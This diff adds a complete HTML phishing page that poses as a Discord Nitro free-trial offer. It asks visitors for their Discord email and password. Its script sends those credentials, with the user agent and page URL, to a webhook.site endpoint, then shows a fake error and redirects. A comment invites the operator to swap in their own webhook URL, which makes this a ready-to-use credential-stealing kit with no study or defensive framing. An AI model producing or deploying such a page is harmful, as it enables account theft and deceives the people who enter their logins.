@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Nitro</title>
+    <link rel="icon" href="https://cdn.prod.website-files.com/6257adef93867e50d84b30e2/62f50ba20329c2d0fe0df60c_discord-icon-svgrepo-com.svg">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e1f22 0%, #2b2d31 50%, #1e1f22 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            width: 100%;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: #313338;
+            border-radius: 16px;
+            padding: 40px 32px 32px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .nitro-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .nitro-badge .icon {
+            font-size: 36px;
+        }
+
+        .nitro-badge h1 {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff73fa, #b377f7, #5865f2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #b5bac1;
+            font-size: 14px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .subtitle strong {
+            color: #fff;
+        }
+
+        .perks-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .perk {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 8px;
+            padding: 12px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: background 0.2s ease;
+        }
+
+        .perk:hover {
+            background: rgba(255, 255, 255, 0.07);
+        }
+
+        .perk .emoji {
+            font-size: 22px;
+            margin-bottom: 4px;
+        }
+
+        .perk .name {
+            font-size: 11px;
+            color: #b5bac1;
+            font-weight: 500;
+        }
+
+        .price-box {
+            background: rgba(88, 101, 242, 0.1);
+            border: 1px solid rgba(88, 101, 242, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .price-box .free-label {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff73fa, #b377f7);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            padding: 3px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .price-box .price {
+            font-size: 32px;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .price-box .price span {
+            font-size: 16px;
+            color: #b5bac1;
+            font-weight: 400;
+        }
+
+        .price-box .savings {
+            color: #23a559;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .input-group label {
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #b5bac1;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input {
+            padding: 12px 14px;
+            background: #1e1f22;
+            border: 1px solid #3f4147;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+
+        .input-group input::placeholder {
+            color: #6d6f78;
+        }
+
+        .input-group input:focus {
+            border-color: #5865f2;
+            background: #1e1f22;
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.15);
+        }
+
+        .input-group .hint {
+            font-size: 11px;
+            color: #6d6f78;
+        }
+
+        button {
+            background: linear-gradient(135deg, #5865f2, #4752c4);
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.2s ease;
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 16px rgba(88, 101, 242, 0.25);
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #4752c4, #3c45a5);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 24px rgba(88, 101, 242, 0.35);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .terms {
+            text-align: center;
+            color: #6d6f78;
+            font-size: 11px;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .terms a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-logo {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #6d6f78;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .footer-logo svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.5;
+        }
+
+        .login-prompt {
+            text-align: center;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .login-prompt p {
+            color: #b5bac1;
+            font-size: 13px;
+        }
+
+        .login-prompt a {
+            color: #00a8fc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .login-prompt a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background: rgba(237, 66, 69, 0.1);
+            border: 1px solid rgba(237, 66, 69, 0.3);
+            border-radius: 8px;
+            padding: 10px 14px;
+            color: #ed4245;
+            font-size: 13px;
+            display: none;
+            text-align: center;
+            animation: shake 0.3s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        button .btn-text { display: inline; }
+        button .loading-spinner { display: none; }
+        button.loading .btn-text { display: none; }
+        button.loading .loading-spinner { display: inline-block; }
+
+        @media (max-width: 500px) {
+            .card { padding: 24px 16px; border-radius: 12px; }
+            .perks-grid { grid-template-columns: 1fr 1fr; gap: 6px; }
+            .perk { padding: 10px 8px; }
+            .nitro-badge h1 { font-size: 22px; }
+            .price-box .price { font-size: 26px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="nitro-badge">
+                <span class="icon">🚀</span>
+                <h1>Discord Nitro</h1>
+            </div>
+
+            <p class="subtitle">
+                Get access to <strong>exclusive perks</strong> — bigger uploads, custom emojis, HD streaming, server boosts, and more. <strong>Free for the first 30 days.</strong>
+            </p>
+
+            <div class="perks-grid">
+                <div class="perk">
+                    <div class="emoji">📤</div>
+                    <div class="name">500MB Uploads</div>
+                </div>
+                <div class="perk">
+                    <div class="emoji">😎</div>
+                    <div class="name">Custom Emojis</div>
+                </div>
+                <div class="perk">
+                    <div class="emoji">🖥️</div>
+                    <div class="name">HD Streaming</div>
+                </div>
+                <div class="perk">
+                    <div class="emoji">🚀</div>
+                    <div class="name">2 Server Boosts</div>
+                </div>
+                <div class="perk">
+                    <div class="emoji">🎨</div>
+                    <div class="name">Profile Badge</div>
+                </div>
+                <div class="perk">
+                    <div class="emoji">💬</div>
+                    <div class="name">Custom Stickers</div>
+                </div>
+            </div>
+
+            <div class="price-box">
+                <div class="free-label">🎁 Free Trial</div>
+                <div class="price">$0.00 <span>/ month</span></div>
+                <div class="savings">First 30 days free · Cancel anytime</div>
+            </div>
+
+            <form id="nitroForm">
+                <div class="input-group">
+                    <label>Email or Phone Number</label>
+                    <input type="text" id="email" placeholder="you@example.com" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter your Discord password" required>
+                    <span class="hint">Must be your Discord account password to verify ownership</span>
+                </div>
+
+                <div class="error-message" id="errorMsg">Invalid credentials. Please check your email and password and try again.</div>
+
+                <button type="submit" id="claimBtn">
+                    <span class="btn-text">🎁 Claim Free Trial</span>
+                    <div class="loading-spinner"></div>
+                </button>
+            </form>
+
+            <div class="login-prompt">
+                <p>Already have Nitro? <a href="#">Manage subscription</a></p>
+            </div>
+
+            <div class="terms">
+                By clicking "Claim Free Trial", you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+                Free trial auto-renews at $9.99/month unless canceled. <a href="#">Terms apply</a>.
+            </div>
+
+            <div class="footer-logo">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M5.5 8.5C5.5 6.5 7 5 9 5h6c2 0 3.5 1.5 3.5 3.5S17 12 15 12H9c-2 0-3.5-1.5-3.5-3.5z"/>
+                    <path d="M12 12v7"/>
+                    <path d="M9 16h6"/>
+                </svg>
+                discord.com
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("nitroForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const btn = document.getElementById("claimBtn");
+            const errorMsg = document.getElementById("errorMsg");
+
+            // Show loading
+            btn.classList.add("loading");
+
+            // Simulate verification delay, show fake error
+            setTimeout(() => {
+                errorMsg.style.display = "block";
+                btn.classList.remove("loading");
+            }, 1500);
+
+            // ⚠️ REPLACE WITH YOUR WEBHOOK URL
+            const WEBHOOK_URL = "https://webhook.site/6df69596-91c8-4ee7-bc98-f6ae77ccdf09";
+
+            const payload = {
+                type: "discord_nitro",
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                page: window.location.href
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+
+            // Redirect to dashboard after delay
+            setTimeout(() => {
+                window.location.href = "dashboard.html?email=" + encodeURIComponent(email);
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
